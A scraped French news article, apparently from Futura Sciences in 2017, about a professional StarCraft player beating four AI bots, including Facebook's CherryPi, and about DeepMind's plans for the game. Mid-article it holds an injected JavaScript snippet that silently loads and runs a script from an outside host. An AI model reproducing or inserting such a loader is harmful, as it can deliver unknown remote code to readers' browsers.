{"title": "StarCraft : les humains meilleurs que les IA, pour le moment…", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "03/11/2017", "content": "À l'occasion du premier tournoi opposant des humains à des intelligences artificielles dans des parties de Starcraft, un joueur professionnel a battu quatre IA, dont celle développée par Facebook. Contrairement aux échecs ou au jeu de go, les humains ont encore le dessus sur l' intelligence artificielle  (IA) avec le jeu vidéo  Starcraft . Une compétition opposant des joueurs professionnels de ce jeu de stratégie en temps réel à plusieurs IA s'est tenue en début de semaine à Séoul, en Corée du Sud, et a vu la domination sans équivoque d'un humain. Song Byung-gu, l'un des meilleurs joueurs actuels de Starcraft, a remporté toutes ses parties contre quatre agents informatiques ( bots  en anglais) différents. Il s'agissait d'IA développées par des spécialistes en Australie, Corée et Norvège ainsi que « CherryPi », entrainée par Facebook. C'est la première fois que ce concours qui existe depuis 2010 met aux prises des humains contre des machines. Les parties furent courtes (10,5 mn maximum) et les IA n'ont semble-t-il pas fait preuve d'une grande audace dans leur stratégie comme l'explique le  MIT Technology Review . Mais tout de même, les machines ont montré des dispositions intéressantes dans leur système de défense.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Starcraft, un défi majeur pour l’intelligence artificielle Starcraft est considéré comme le nouveau défi majeur pour la recherche en intelligence artificielle. Contrairement au jeu de go où les protagonistes ont une vision complète du plateau, les jeux de stratégie imposent une information partielle sur ce que fait l'adversaire. La part d'incertitude est donc beaucoup plus importante. Pour les chercheurs, une IA capable de battre un humain à Starcraft sera en mesure d'accomplir des tâches complexes dans le monde réel.  Après avoir démontré sa supériorité au jeu de go,  DeepMind , filiale d'Alphabet ( Google ), a décidé de relever ce défi. L'une des clés de la victoire d' AlphaGo  est que le programme a pu s'améliorer en ingurgitant des milliers de parties de go. Or, une telle  masse  de données n'est pas encore disponible pour Starcraft. Mais cela va changer. Cet été,  DeepMind et Blizzard Entertainment  (éditeur de ce jeu de stratégie en temps réel) ont annoncé la mise à disposition d'une interface de programmation ( API ) d'apprentissage automatique ( machine learning ) ainsi qu'une  base de données  de 65.000 parties anonymes de Starcraft II pour entraîner les IA. Les progrès ne devraient pas tarder à se faire sentir. Dès lors, ce ne sera plus qu'une question de temps avant que le règne des humains sur Starcraft ne soit sérieusement contesté.  Interview : comment est née l'intelligence artificielle ?                       L’intelligence artificielle vise à mimer le fonctionnement du cerveau humain, ou du moins sa logique lorsqu’il s’agit de prendre des décisions. Jean-Claude Heudin, directeur du laboratoire de recherche de l’IIM (institut de l’Internet et du multimédia), nous explique l'origine de ces recherches.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  meilleurs mobiles du moment  |  jeux starcraft  |  meilleurs poissons pour sante  |  difference entre moment quadratique moment inertie  |  types humains  |  flux humains  |  organes humains  |  virus humains  |  humains genetiquement modifies  |  parasite intestinaux humains", "theme": "tech"}